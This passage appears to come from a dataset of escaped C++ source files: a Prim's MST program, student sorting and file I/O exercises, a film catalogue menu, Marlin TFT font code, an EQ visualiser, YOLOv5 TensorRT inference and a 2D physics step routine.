grafo(qtd_vertices, std::vector<ParInteiros>());\n\n  for (i = 0; i < qtd_arestas; i++) {\n    *in >> u >> v >> w;\n    u--;\n    v--;\n    grafo[u].push_back({w, v});\n    grafo[v].push_back({w, u});\n  }\n\n  return grafo;\n}\n\nDados prim(Grafo &grafo, unsigned v0) {\n  unsigned u, v;\n  int w;\n\n  std::vector<int> custo(grafo.size(), INT_MAX);\n  std::vector<int> prev(grafo.size(), -1);\n  std::vector<bool> visitado(grafo.size(), false);\n  std::priority_queue<ParInteiros, std::vector<ParInteiros>, std::greater<ParInteiros>> heap;\n\n  custo[v0] = 0;\n  heap.push({custo[v0], v0});\n\n  while (!heap.empty()) {\n    v = heap.top().second;\n    heap.pop();\n\n    if (visitado[v]) {\n      continue;\n    } else {\n      visitado[v] = true;\n    }\n\n    for (ParInteiros aresta : grafo[v]) {\n      u = aresta.second;\n      w = aresta.first;\n\n      if (!visitado[u] && custo[u] > w) {\n        custo[u] = w;\n        prev[u] = (int)v;\n        heap.push({custo[u], u});\n      }\n    }\n  }\n\n  return {prev, custo};\n}\n\nvoid imprimir_saida(std::ostream *saida, Dados &dados, bool mostrar_solucao) {\n  int custo_total = 0;\n  unsigned v;\n\n  if (mostrar_solucao) {\n    for (v = 0; v < dados.prev.size(); v++) {\n      if (dados.prev[v] != -1) {\n        *saida << \"(\" << v + 1 << \",\" << dados.prev[v] + 1 << \") \";\n      }\n    }\n  } else {\n    for (v = 0; v < dados.custo.size(); v++) {\n      custo_total += dados.custo[v];\n    }\n\n    *saida << custo_total;\n  }\n\n  *saida << std::endl;\n}\n\nvoid configurar_terminal() {\n#ifdef _WIN32\n  // Evita problemas com texto no terminal no Windows\n  // https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/setlocale-wsetlocale?view=msvc-170#utf-8-support\n  setlocale(LC_ALL, \".UTF8\");\n#endif /* WIN32 */\n}\n\nint main(int argc, char *argv[]) {\n  char *caminho_entrada = nullptr, *caminho_saida = nullptr, *arg;\n  unsigned vertice_inicial = 0;\n  bool mostrar_solucao = false;\n  int i;\n\n  configurar_terminal();\n\n  for (i = 1; i < argc; i++) {\n    arg = argv[i];\n    if (!strcmp(arg, \"-h\")) {\n      std::cout << TEXTO_AJUDA << std::flush;\n      return EXIT_SUCCESS;\n    } else if (!strcmp(arg, \"-o\")) {\n      caminho_saida = argv[++i];\n    } else if (!strcmp(arg, \"-f\")) {\n      caminho_entrada = argv[++i];\n    } else if (!strcmp(arg, \"-s\")) {\n      mostrar_solucao = true;\n    } else if (!strcmp(arg, \"-i\")) {\n      vertice_inicial = (unsigned)strtoul(argv[++i], nullptr, 10) - 1;\n    } else {\n      std::cerr << TEXTO_ERRO << std::flush;\n      return EXIT_FAILURE;\n    }\n  }\n\n  std::istream *entrada = &std::cin;\n  std::ifstream arquivo_entrada;\n  if (caminho_entrada) {\n    arquivo_entrada.open(caminho_entrada);\n    entrada = &arquivo_entrada;\n  }\n\n  std::ostream *saida = &std::cout;\n  std::ofstream arquivo_saida;\n  if (caminho_saida) {\n    arquivo_saida.open(caminho_saida);\n    saida = &arquivo_saida;\n  }\n\n  Grafo grafo = ler_grafo(entrada);\n  Dados dados = prim(grafo, vertice_inicial);\n  imprimir_saida(saida, dados, mostrar_solucao);\n\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\nusing namespace std;\n\nstruct mahasiswa{\n    string nama;\n    string nim;\n    float ipk;\n};\n\nvoid sort(mahasiswa data[],int n){\n    mahasiswa t;\n    for(int i=0;i<=n-1;i++){\n        for (int j=0;j<=(n-2);j++){\n            if (data[j].ipk < data [j+1].ipk || \n            (data[j].ipk == data [j+1].ipk && data[j].nim < data [j+1].nim)){\n                t=data[j];\n                data[j]=data[j+1];\n                data[j+1]=t;\n            }\n        }\n    }\n}\n\n\nint main(){\n    int n;\n    cout<<\" Jumlah mahasiswa: \";\n    cin>>n;\n    mahasiswa data[n];\n    for(int i=0;i<=(n-1);i++){\n        cout<<\" Nama Mahasiswa: \";\n        cin>>data[i].nama;\n        cout<<\" NIM Mahasiswa: \";\n        cin>>data[i].nim;\n        cout<<\" IPK Mahasiswa: \";\n        cin>>data[i].ipk;\n        cout<<endl;\n    }\n    sort(data, n);\n    \n    cout<<\" Data Mahasiswa Setelah Sorting\"<<endl;\n    for(int i=0;i<=(n-1);i++){\n        cout<<\" NIM Mahasiswa: \"<<data[i].nim<<endl;\n        cout<<\" Nama Mahasiswa: \"<<data[i].nama<<endl;\n        cout<<\" IPK Mahasiswa: \"<<data[i].ipk<<endl;\n        cout<<endl;\n    }\n    return 0;\n}\n\n",
    "// Azraf Hossain\n// Worked with Halimatou Diaby\n// Lab 6\n// 10.15.24\n\n#include <iostream>\n#include <string> \n#include <iomanip>\n#include <cstdlib> \n#include <fstream> // New library, used to read and write in files outside of this program\n\nusing namespace std; // required\n \nint main () // fuction where the code can run\n{\n    // defining of our variables\n    int integer1;\n    int integer2;\n    char charr;\n    string stringg;\n\n    // Step 2: Declare an ifstream & ofstream variables\n    ifstream inFile; \n    ofstream outFile;\n    // Step 3: Open the files\n    inFile.open(\"inData.txt\");\n    outFile.open(\"outData.txt\");\n    \n    // here, the inFile >> ... code reads our input file, the inData.txt file\n    // the outFile << ... code outputs the sum of the two integers read in the input file\n    inFile >> integer1 >> integer2;\n    outFile << integer1 + integer2 << endl;\n\n    // inFile reads the character\n    // outFile prints out the ASCII value of the character selected, then adds one to represent the next ASCII number\n    inFile >> charr;\n    outFile << charr + 1 << endl;\n\n    // inFile reads the string\n    // ouFile outputs it\n    inFile >> stringg;\n    outFile << stringg << endl;\n\n    // Last step to close the file\n    inFile.close();\n    outFile.close();\n}\n\n/*\n80\n83\nHowdy!\n*/",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct VideoStore\n{\n    string NameFilm;\n    string FilmDirector;\n    string Genre;\n    int Score;\n    int Cost;\n};\n\nvoid Out(VideoStore name[], int index)\n{\n    cout << \"Name film: \" << name[index].NameFilm << endl;\n    cout << \"Name of the movie director: \" << name[index].FilmDirector << endl;\n    cout << \"Film genre: \" << name[index].Genre << endl;\n    cout << \"Film score: \" << name[index].Score << endl;\n    cout << \"Film cost: \" << name[index].Cost << endl;\n    cout << \"<<---------------------------------------------------------------------->>\" << endl;\n}\nvoid Viewing(VideoStore name[], int size)\n{\n    for (int i = 0; i < size; i++) {\n        cout << \"<<---------------------------------------------------------------------->>\" << endl;\n        cout << \"Name film: \" << name[i].NameFilm << endl;\n        cout << \"Name of the movie director: \" << name[i].FilmDirector << endl;\n        cout << \"Film genre: \" << name[i].Genre << endl;\n        cout << \"Film score: \" << name[i].Score << endl;\n        cout << \"Film cost: \" << name[i].Cost << endl;\n        cout << \"<<---------------------------------------------------------------------->>\" << endl;\n    }\n}\nvoid InputData(VideoStore* name, int size)\n{\n    for (int i = 0; i < size; i++)\n    {\n        cin.ignore();\n        cout << \"Enter name film:\";                   getline(cin, name[i].NameFilm);\n        cout << \"Enter name of the movie director:\";  getline(cin, name[i].FilmDirector);\n        cout << \"Enter genre:\";                       getline(cin, name[i].Genre);\n        cout << \"Enter score:\";                       cin >> name[i].Score;\n        cout << \"Enter cost:\";                        cin >> name[i].Cost;\n        cin.ignore();\n    }\n}\nvoid SearchName(VideoStore name[], int size, string namefilm)\n{\n    bool find = false;\n    for (int i = 0; i < size; i++)\n    {\n        if (name[i].NameFilm == namefilm)\n        {\n            Out(name, i);\n            find = true;\n        }\n    }\n    if (find != true)\n    {\n        cout << \"Cant find film or you write incorect name!\";\n    }\n}\nvoid SearchGenre(VideoStore name[], int size, string namegenre)\n{\n    bool find = false;\n    for (int i = 0; i < size; i++)\n    {\n        if (name[i].Genre == namegenre)\n        {\n            Out(name, i);\n            find = true;\n        }\n    }\n    if (find != true)\n    {\n        cout << \"Cant find genre or you write incorect genre!\";\n    }\n}\nvoid SearchNameDirector(VideoStore name[], int size, string namefilmDirector)\n{\n    bool find = false;\n    for (int i = 0; i < size; i++)\n    {\n        if (name[i].FilmDirector == namefilmDirector)\n        {\n            Out(name, i);\n            find = true;\n        }\n    }\n    if (find != true)\n    {\n        cout << \"Cant find director or you write incorect name!\";\n    }\n}\nvoid TheMostFilm(VideoStore name[], int size, string namegenre)\n{\n    int pos = -1; int scoring = 0;\n    for (int i = 0; i < size; i++)\n    {\n        if (name[i].Genre == namegenre)\n        {\n            if (name[i].Score > scoring)\n            {\n                pos = i;\n            }\n            else\n            {\n                continue;\n            }\n        }\n    }\n    if (pos != -1)\n    {\n        Out(name, pos);\n    }\n    else\n    {\n        cout << \"No films found for the specified genre!\" << endl;\n    }\n}\nvoid Show_com()\n{\n    cout << \"1.Enter records\" << endl;\n    cout << \"2.Show all records\" << endl;\n    cout << \"3.Search for a movie by title\" << endl;\n    cout << \"4.Search for a movie by genre\" << endl;\n    cout << \"5.Search for a movie by director\" << endl;\n    cout << \"6.The most popular movie by genre\" << endl;\n    cout << \"0.Exit\" << endl;\n}\n\nvoid Avtor() \n{\n    cout << \"About avtor\" << endl;\n    cout << \"I'm 16 \" << endl;\n    cout << \"I study at IT Step\" << endl;\n    cout << \"I live in Ukraine\" << endl;\n}\n\n\n\n\n\nint main()\n{\n    int size;\n    cout << \"Enter the number of movies: \";\n    cin >> size;\n\n    VideoStore* arr = new VideoStore[size];\n\n    int count;\n    string searchInput;\n\n    do {\n        Show_com();\n        cout << \"Enter your choice: \";\n        cin >> count;\n\n        switch (count)\n        {\n        case 1:\n            InputData(arr, size);\n            break;\n\n        case 2:\n            Viewing(arr, size);\n            break;\n\n        case 3:\n            cout << \"Enter the name of the movie: \";\n            cin.ignore();\n            getline(cin, searchInput);\n            SearchName(arr, size, searchInput);\n            break;\n\n        case 4:\n            cout << \"Enter the genre of the movie: \";\n            cin.ignore();\n            getline(cin, searchInput);\n            SearchGenre(arr, size, searchInput);\n            break;\n\n        case 5:\n            cout << \"Enter the director's name: \";\n            cin.ignore();\n            getline(cin, searchInput);\n            SearchNameDirector(arr, size, searchInput);\n            break;\n\n        case 6:\n            cout << \"Enter the genre to find the ",
    "/**\n * Marlin 3D Printer Firmware\n * Copyright (c) 2020 MarlinFirmware [https://github.com/MarlinFirmware/Marlin]\n *\n * Based on Sprinter and grbl.\n * Copyright (c) 2011 Camiel Gubbels / Erik van der Zalm\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <https://www.gnu.org/licenses/>.\n *\n */\n\n#include \"../../inc/MarlinConfig.h\"\n\n#if HAS_GRAPHICAL_TFT\n\n#include \"tft_string.h\"\n#include \"../fontutils.h\"\n#include \"../marlinui.h\"\n\n//#define DEBUG_TFT_FONT\n#define DEBUG_OUT ENABLED(DEBUG_TFT_FONT)\n#include \"../../core/debug_out.h\"\n\nglyph_t *TFT_String::glyphs[256];\nfont_t *TFT_String::font_header;\n\nuint8_t TFT_String::data[];\nuint16_t TFT_String::span;\nuint8_t TFT_String::length;\n\nvoid TFT_String::set_font(const uint8_t *font) {\n  font_header = (font_t *)font;\n  uint32_t glyph;\n\n  for (glyph = 0; glyph < 256; glyph++) glyphs[glyph] = nullptr;\n\n  DEBUG_ECHOLNPAIR(\"Format: \",            font_header->Format);\n  DEBUG_ECHOLNPAIR(\"BBXWidth: \",          font_header->BBXWidth);\n  DEBUG_ECHOLNPAIR(\"BBXHeight: \",         font_header->BBXHeight);\n  DEBUG_ECHOLNPAIR(\"BBXOffsetX: \",        font_header->BBXOffsetX);\n  DEBUG_ECHOLNPAIR(\"BBXOffsetY: \",        font_header->BBXOffsetY);\n  DEBUG_ECHOLNPAIR(\"CapitalAHeight: \",    font_header->CapitalAHeight);\n  DEBUG_ECHOLNPAIR(\"Encoding65Pos: \",     font_header->Encoding65Pos);\n  DEBUG_ECHOLNPAIR(\"Encoding97Pos: \",     font_header->Encoding97Pos);\n  DEBUG_ECHOLNPAIR(\"FontStartEncoding: \", font_header->FontStartEncoding);\n  DEBUG_ECHOLNPAIR(\"FontEndEncoding: \",   font_header->FontEndEncoding);\n  DEBUG_ECHOLNPAIR(\"LowerGDescent: \",     font_header->LowerGDescent);\n  DEBUG_ECHOLNPAIR(\"FontAscent: \",        font_header->FontAscent);\n  DEBUG_ECHOLNPAIR(\"FontDescent: \",       font_header->FontDescent);\n  DEBUG_ECHOLNPAIR(\"FontXAscent: \",       font_header->FontXAscent);\n  DEBUG_ECHOLNPAIR(\"FontXDescent: \",      font_header->FontXDescent);\n\n  add_glyphs(font);\n}\n\nvoid TFT_String::add_glyphs(const uint8_t *font) {\n  uint32_t glyph;\n  uint8_t *pointer = (uint8_t *)font + sizeof(font_t);\n\n  for (glyph = ((font_t *)font)->FontStartEncoding; glyph <= ((font_t *)font)->FontEndEncoding; glyph++) {\n    if (*pointer != NO_GLYPH) {\n      glyphs[glyph] = (glyph_t *)pointer;\n      pointer += sizeof(glyph_t) + ((glyph_t *)pointer)->DataSize;\n    }\n    else\n      pointer++;\n  }\n}\n\nvoid TFT_String::set() {\n  *data = 0x00;\n  span = 0;\n  length = 0;\n}\n\nuint8_t read_byte(uint8_t *byte) { return *byte; }\n\n/**\n * Add a string, applying substitutions for the following characters:\n *\n *   = displays  '0'....'10' for indexes 0 - 10\n *   ~ displays  '1'....'11' for indexes 0 - 10\n *   * displays 'E1'...'E11' for indexes 0 - 10 (By default. Uses LCD_FIRST_TOOL)\n */\nvoid TFT_String::add(uint8_t *string, int8_t index, uint8_t *itemString) {\n  wchar_t wchar;\n\n  while (*string) {\n    string = get_utf8_value_cb(string, read_byte, &wchar);\n    if (wchar > 255) wchar |= 0x0080;\n    uint8_t ch = uint8_t(wchar & 0x00FF);\n\n    if (ch == '=' || ch == '~' || ch == '*') {\n      if (index >= 0) {\n        int8_t inum = index + ((ch == '=') ? 0 : LCD_FIRST_TOOL);\n        if (ch == '*') add_character('E');\n        if (inum >= 10) { add_character('0' + (inum / 10)); inum %= 10; }\n        add_character('0' + inum);\n      }\n      else {\n        add(index == -2 ? GET_TEXT(MSG_CHAMBER) : GET_TEXT(MSG_BED));\n      }\n      continue;\n    }\n    else if (ch == '$' && itemString) {\n      add(itemString);\n      continue;\n    }\n\n    add_character(ch);\n  }\n  eol();\n}\n\nvoid TFT_String::add(uint8_t *string, uint8_t max_len) {\n  wchar_t wchar;\n  while (*string && max_len) {\n    string = get_utf8_value_cb(string, read_byte, &wchar);\n    if (wchar > 255) wchar |= 0x0080;\n    uint8_t ch = uint8_t(wchar & 0x00FF);\n    add_character(ch);\n    max_len--;\n  }\n  eol();\n}\n\nvoid TFT_String::add_character(uint8_t character) {\n  if (length < MAX_STRING_LENGTH) {\n    data[length] = character;\n    length++;\n    span += glyph(character)->DWidth;\n  }\n}\n\nvoid TFT_String::rtrim(uint8_t character) {\n  while (length) {\n    if (data[length - 1] == 0x20 || data[length - 1] == character) {\n      length--;\n      span -= glyph(data[length])->DWidth;\n      eol();\n    }\n    else {\n      break;\n    }\n  }\n}\n\nvoid TFT_String::ltrim(uint8_t character) {\n  uint16_t i, j;\n  for (i = 0; (i < length) && (data[i] == 0x20 || data[i] == character); i++) {\n    span -= glyph(data[i])->DWidth;\n  }\n  if (i == 0) return;\n  for (j ",
    "#include <precomp.h>\n\n#include <api/wnd/popup.h>\n#include <math.h>\n#include <api/skin/skinparse.h>\n#include <api/service/svc_enum.h>\n#include <api/service/svcs/svc_skinfilter.h>\n#include <api/skin/widgets/seqvis.h>\n#include <api/core/api_core.h>\n#include <tataki/canvas/bltcanvas.h>\nconst wchar_t eqVisXuiStr[] = L\"EQVis\"; // This is the xml tag\nchar eqVisXuiSvcName[] = \"EQVis xui object\"; // this is the name of the xuiservice\nXMLParamPair SEQVis::params[] =\n  {\n    {\n      SEQVIS_SETCOLORBOTTOM, L\"COLORBOTTOM\"\n    },\n    {SEQVIS_SETCOLORMIDDLE, L\"COLORMIDDLE\"},\n    {SEQVIS_SETCOLORPREAMP, L\"COLORPREAMP\"},\n    {SEQVIS_SETCOLORTOP, L\"COLORTOP\"},\n    {SEQVIS_SETALPHA, L\"GAMMA\"},  // BACKWARD COMPAT\n  };\nSEQVis::SEQVis()\n{\n\tgetScriptObject()->vcpu_setInterface(eqvisGuid, (void *)static_cast<SEQVis *>(this));\n\tgetScriptObject()->vcpu_setClassName(L\"EqVis\");\n\tgetScriptObject()->vcpu_setController(eqvisController);\n\tcolortop = colormid = colorbottom = 0xffffff;\n\tcolorpreamp = 0x888888;\n\tshadedColors = NULL;\n\tbc = NULL;\n\tsfe = new SkinFilterEnum();\n\n\twhile (1)\n\t{\n\t\tsvc_skinFilter *obj = sfe->getNext();\n\t\tif (!obj) break;\n\t\tfilters.addItem(obj);\n\t}\n\txuihandle = newXuiHandle();\n\tCreateXMLParameters(xuihandle);\n\t\n}\n\nvoid SEQVis::CreateXMLParameters(int master_handle)\n{\n\t//SEQVIS_PARENT::CreateXMLParameters(master_handle);\n\tint numParams = sizeof(params) / sizeof(params[0]);\n\thintNumberOfParams(xuihandle, numParams);\n\tfor (int i = 0;i < numParams;i++)\n\t\taddParam(xuihandle, params[i], XUI_ATTRIBUTE_IMPLIED);\n}\n\nint SEQVis::onInit()\n{\n\tSEQVIS_PARENT::onInit();\n\tWASABI_API_MEDIACORE->core_addCallback(0, this);\n\treturn 1;\n}\n\nSEQVis::~SEQVis()\n{\n\tforeach(filters)\n\tsfe->release(filters.getfor());\n\tendfor;\n\tdelete sfe;\n\tif (shadedColors) FREE(shadedColors);\n\tdelete(bc);\n\tWASABI_API_MEDIACORE->core_delCallback(0, this);\n}\n\nint SEQVis::setXuiParam(int _xuihandle, int attrid, const wchar_t *paramname, const wchar_t *strvalue)\n{\n\tif (_xuihandle != xuihandle) return SEQVIS_PARENT::setXuiParam(_xuihandle, attrid, paramname, strvalue);\n\tswitch (attrid)\n\t{\n\t\tcase SEQVIS_SETALPHA:\n\t\t\tgetGuiObject()->guiobject_setAlpha(WTOI(strvalue));\n\t\t\tbreak;\n\t\tcase SEQVIS_SETCOLORTOP:\n\t\t\tcolortop = RGBTOBGR(SkinParser::parseColor(strvalue));\n\t\t\tbreak;\n\t\tcase SEQVIS_SETCOLORMIDDLE:\n\t\t\tcolormid = RGBTOBGR(SkinParser::parseColor(strvalue));\n\t\t\tbreak;\n\t\tcase SEQVIS_SETCOLORBOTTOM:\n\t\t\tcolorbottom = RGBTOBGR(SkinParser::parseColor(strvalue));\n\t\t\tbreak;\n\t\tcase SEQVIS_SETCOLORPREAMP:\n\t\t\tcolorpreamp = RGBTOBGR(SkinParser::parseColor(strvalue));\n\t\t\tbreak;\n\t\tdefault:\n\t\t\treturn 0;\n\t}\n\treturn 1;\n}\n\nvoid SEQVis::splineGetPoint(spline_struct *s, float frame, float *out)\n{\n\tint i, i_1, i0, i1, i2;\n\tfloat time1, time2, time3;\n\tfloat t1, t2, t3, t4, u1, u2, u3, u4, v1, v2, v3;\n\tfloat a, b, c, d;\n\n\tfloat *keys = s->keys;\n\n\ta = (1 - s->tens) * (1 + s->cont) * (1 + s->bias);\n\tb = (1 - s->tens) * (1 - s->cont) * (1 - s->bias);\n\tc = (1 - s->tens) * (1 - s->cont) * (1 + s->bias);\n\td = (1 - s->tens) * (1 + s->cont) * (1 - s->bias);\n\tv1 = t1 = -a / 2.0f; u1 = a;\n\tu2 = (-6 - 2 * a + 2 * b + c) / 2.0f; v2 = (a - b) / 2.0f; t2 = (4 + a - b - c) / 2.0f;\n\tt3 = (-4 + b + c - d) / 2.0f;\n\tu3 = (6 - 2 * b - c + d) / 2.0f;\n\tv3 = b / 2.0f;\n\tt4 = d / 2.0f; u4 = -t4;\n\n\ti0 = (int) frame;\n\ti_1 = i0 - 1;\n\twhile (i_1 < 0) i_1 += s->numKeys;\n\ti1 = i0 + 1;\n\twhile (i1 >= s->numKeys) i1 -= s->numKeys;\n\ti2 = i0 + 2;\n\twhile (i2 >= s->numKeys) i2 -= s->numKeys;\n\ttime1 = frame - (float)((int) frame);\n\ttime2 = time1 * time1;\n\ttime3 = time2 * time1;\n\ti0 *= s->keyWidth;\n\ti1 *= s->keyWidth;\n\ti2 *= s->keyWidth;\n\ti_1 *= s->keyWidth;\n\tfor (i = 0; i < s->keyWidth; i ++)\n\t{\n\t\ta = t1 * keys[i + i_1] + t2 * keys[i + i0] + t3 * keys[i + i1] + t4 * keys[i + i2];\n\t\tb = u1 * keys[i + i_1] + u2 * keys[i + i0] + u3 * keys[i + i1] + u4 * keys[i + i2];\n\t\tc = v1 * keys[i + i_1] + v2 * keys[i + i0] + v3 * keys[i + i1];\n\t\t*out++ = a * time3 + b * time2 + c * time1 + keys[i + i0];\n\t}\n}\n\nvoid SEQVis::DrawEQVis()\n{\n\n\tif (!shadedColors) return ;\n\n\tfloat keys[12] = {0};\n\tspline_struct spline = {keys, 1, 12, 0.0f, 0.0f, 0.1f};\n\n\tMEMSET(specData, 0, cur_w*cur_h*4);\n\n\tint ph = (int)((127 + WASABI_API_MEDIACORE->core_getEqPreamp(0)) * ((float)cur_h) / 256.0f);\n\tph *= cur_w;\n\tfor (int j = 0;j < cur_w;j++)\n\t\tspecData[j + ph] = colorpreamp | 0xFF000000; // alpha :)\n\n\t{\n\t\tint x;\n\t\tint last_p = -1;\n\t\tfor (x = 0; x < 10; x ++)\n\t\t\tkeys[x + 1] = (127 - WASABI_API_MEDIACORE->core_getEqBand(0, x)) * ((float)cur_h) / 256.0f;\n\t\tkeys[0] = keys[1];\n\t\tkeys[11] = keys[10];\n\n\t\tfor (x = 0; x < cur_w; x ++)\n\t\t{\n\t\t\tfloat p;\n\t\t\tint this_p;\n\t\t\tsplineGetPoint(&spline, 1.0f + x / (cur_w*11.0f / 100.0f), &p);\n\t\t\tthis_p = (int)p;\n\t\t\tif (this_p < 0) this_p = 0;\n\t\t\tif (this_p >= cur_h) this_p = cur_h - 1;\n\t\t\tif (last_p == -1 || this_p == last_p)\n\t\t\t\tspecData[x + this_p*cur_w] = shadedColors[this_p];\n\t\t\telse\n\t\t\t{\n\t\t\t\tif (this_p < last_p)\n\t\t\t\t\tfor (int j = 0;j < last_p - this_p + 1;j++)\n\t\t\t\t\t\tspecData[x + (this_p + j)*cur_w] = shadedColors[this_p + j];\n\t\t\t\tel",
    "#include \"yolov5.hpp\"\r\n\r\n\r\nint main(int argc, char** argv) {\r\n    cudaSetDevice(DEVICE);\r\n\r\n    std::string wts_name = \"\";\r\n    std::string engine_name = \"\";\r\n    float gd = 0.0f, gw = 0.0f;\r\n    std::string img_dir;\r\n    if (!parse_args(argc, argv, wts_name, engine_name, gd, gw, img_dir)) {\r\n        std::cerr << \"arguments not right!\" << std::endl;\r\n        std::cerr << \"./yolov5 -s [.wts] [.engine] [s/m/l/x or c gd gw]  // serialize model to plan file\" << std::endl;\r\n        std::cerr << \"./yolov5 -d [.engine] ../samples  // deserialize plan file and run inference\" << std::endl;\r\n        return -1;\r\n    }\r\n\r\n    // create a model using the API directly and serialize it to a stream\r\n    if (!wts_name.empty()) {\r\n        IHostMemory* modelStream{ nullptr };\r\n        APIToModel(BATCH_SIZE, &modelStream, wts_name);\r\n        assert(modelStream != nullptr);\r\n        std::ofstream p(engine_name, std::ios::binary);\r\n        if (!p) {\r\n            std::cerr << \"could not open plan output file\" << std::endl;\r\n            return -1;\r\n        }\r\n        p.write(reinterpret_cast<const char*>(modelStream->data()), modelStream->size());\r\n        modelStream->destroy();\r\n        return 0;\r\n    }\r\n\r\n    // deserialize the .engine and run inference\r\n    std::ifstream file(engine_name, std::ios::binary);\r\n    if (!file.good()) {\r\n        std::cerr << \"read \" << engine_name << \" error!\" << std::endl;\r\n        return -1;\r\n    }\r\n    char *trtModelStream = nullptr;\r\n    size_t size = 0;\r\n    file.seekg(0, file.end);\r\n    size = file.tellg();\r\n    file.seekg(0, file.beg);\r\n    trtModelStream = new char[size];\r\n    assert(trtModelStream);\r\n    file.read(trtModelStream, size);\r\n    file.close();\r\n\r\n    std::vector<std::string> file_names;\r\n    if (read_files_in_dir(img_dir.c_str(), file_names) < 0) {\r\n        std::cerr << \"read_files_in_dir failed.\" << std::endl;\r\n        return -1;\r\n    }\r\n\r\n    // prepare input data ---------------------------\r\n    static float data[BATCH_SIZE * 3 * INPUT_H * INPUT_W];\r\n    //for (int i = 0; i < 3 * INPUT_H * INPUT_W; i++)\r\n    //    data[i] = 1.0;\r\n    static float prob[BATCH_SIZE * OUTPUT_SIZE];\r\n    static int seg_out[BATCH_SIZE * IMG_H * IMG_W];\r\n    static int lane_out[BATCH_SIZE * IMG_H * IMG_W];\r\n    IRuntime* runtime = createInferRuntime(gLogger);\r\n    assert(runtime != nullptr);\r\n    ICudaEngine* engine = runtime->deserializeCudaEngine(trtModelStream, size);\r\n    assert(engine != nullptr);\r\n    IExecutionContext* context = engine->createExecutionContext();\r\n    assert(context != nullptr);\r\n    delete[] trtModelStream;\r\n    assert(engine->getNbBindings() == 4);\r\n    void* buffers[4];\r\n    // In order to bind the buffers, we need to know the names of the input and output tensors.\r\n    // Note that indices are guaranteed to be less than IEngine::getNbBindings()\r\n    const int inputIndex = engine->getBindingIndex(INPUT_BLOB_NAME);\r\n    const int output_det_index = engine->getBindingIndex(OUTPUT_DET_NAME);\r\n    const int output_seg_index = engine->getBindingIndex(OUTPUT_SEG_NAME);\r\n    const int output_lane_index = engine->getBindingIndex(OUTPUT_LANE_NAME);\r\n    assert(inputIndex == 0);\r\n    assert(output_det_index == 1);\r\n    assert(output_seg_index == 2);\r\n    assert(output_lane_index == 3);\r\n    // Create GPU buffers on device\r\n    CUDA_CHECK(cudaMalloc(&buffers[inputIndex], BATCH_SIZE * 3 * INPUT_H * INPUT_W * sizeof(float)));\r\n    CUDA_CHECK(cudaMalloc(&buffers[output_det_index], BATCH_SIZE * OUTPUT_SIZE * sizeof(float)));\r\n    CUDA_CHECK(cudaMalloc(&buffers[output_seg_index], BATCH_SIZE * IMG_H * IMG_W * sizeof(int)));\r\n    CUDA_CHECK(cudaMalloc(&buffers[output_lane_index], BATCH_SIZE * IMG_H * IMG_W * sizeof(int)));\r\n    // Create stream\r\n    cudaStream_t stream;\r\n    CUDA_CHECK(cudaStreamCreate(&stream));\r\n\r\n    // store seg results\r\n    cv::Mat tmp_seg(IMG_H, IMG_W, CV_32S, seg_out);\r\n    // store lane results\r\n    cv::Mat tmp_lane(IMG_H, IMG_W, CV_32S, lane_out);\r\n    // PrintMat(tmp_seg);\r\n    std::vector<cv::Vec3b> segColor;\r\n    segColor.push_back(cv::Vec3b(0, 0, 0));\r\n    segColor.push_back(cv::Vec3b(0, 255, 0));\r\n    segColor.push_back(cv::Vec3b(255, 0, 0));\r\n\r\n    std::vector<cv::Vec3b> laneColor;\r\n    laneColor.push_back(cv::Vec3b(0, 0, 0));\r\n    laneColor.push_back(cv::Vec3b(0, 0, 255));\r\n    laneColor.push_back(cv::Vec3b(0, 0, 0));\r\n\r\n    int fcount = 0;  // set for batch-inference\r\n    for (int f = 0; f < (int)file_names.size(); f++) {\r\n        fcount++;\r\n        if (fcount < BATCH_SIZE && f + 1 != (int)file_names.size()) continue;\r\n\r\n        // preprocess ~3ms\r\n        for (int b = 0; b < fcount; b++) {\r\n            cv::Mat img = cv::imread(img_dir + \"/\" + file_names[f - fcount + 1 + b]);  // load image takes ~17ms\r\n            if (img.empty()) continue;\r\n            //cv::cvtColor(img, img, cv::COLOR_BGR2RGB);\r\n            cv::Mat pr_img = preprocess_img(img, INPUT_W, INPUT_H); // letterbox\r\n            int i = 0;\r\n            // BGR to RGB and normalize\r\n            f",
    "#include \"World.h\"\n#include \"raymath.h\"\n\nWorld::World() : gravity(980.0f) {}\n\nvoid World::AddBody(const Body2D& body) {\n    bodies.push_back(body);\n}\n\nBody2D& World::GetBody(int index) {\n    return bodies[index];\n}\n\nvoid World::RemoveBody(Body2D& body) {\n    for (size_t i = 0; i < bodies.size(); ++i) {\n        if (&bodies[i] == &body) {\n            bodies.erase(bodies.begin() + i);\n            break;\n\n        }\n    }\n}\n\nstd::vector<Body2D>& World::GetBodies() {\n    return bodies;\n}\n\nvoid World::Step(float dt, int iterations) {\n    iterations = std::max(MinIter, std::min(iterations, MaxIter));\n\n    for (int iter = 0; iter < iterations; ++iter) {\n        if (bodies.empty()) return;\n\n        for (Body2D& body : bodies) {\n            body.step(dt / iterations, gravity);\n        }\n\n        BroadPhase();  // Perform broad phase collision detection\n        NarrowPhase(); // Perform narrow phase collision detection\n    }\n}\n\nvoid World::BroadPhase() {\n    ContactPair.clear();\n\n    for (size_t i = 0; i < bodies.size(); ++i) {\n        for (size_t j = i + 1; j < bodies.size(); ++j) {\n            if (collision.IntersectAABB(bodies[i].aabb, bodies[j].aabb)) \n                ContactPair.emplace_back(i, j); // Store pairs that may collide\n            \n        }\n    }\n}\n\nvoid World::NarrowPhase() {\n    Vector2 normal;\n    float depth;\n\n    for (const ContactPairs& pair : ContactPair) {\n        Body2D& body1 = bodies[pair.i];\n        Body2D& body2 = bodies[pair.j];\n\n        if (collision.CollisionHandle(body1, body2, normal, depth)) {\n            Vector2 Point1, Point2;\n            int Count = 0;\n            SeperateBody(body1, body2, normal, depth);\n            collision.FindContactPoints(body1, body2, Point1, Point2, Count);\n            CollisionManifold Manifold(body1, body2, normal, depth, Point1, Point2, Count);\n            ResolveCollisionRotationFriction(Manifold);\n        }\n    }\n}\nvoid World::SeperateBody(Body2D& body1,Body2D& body2,Vector2 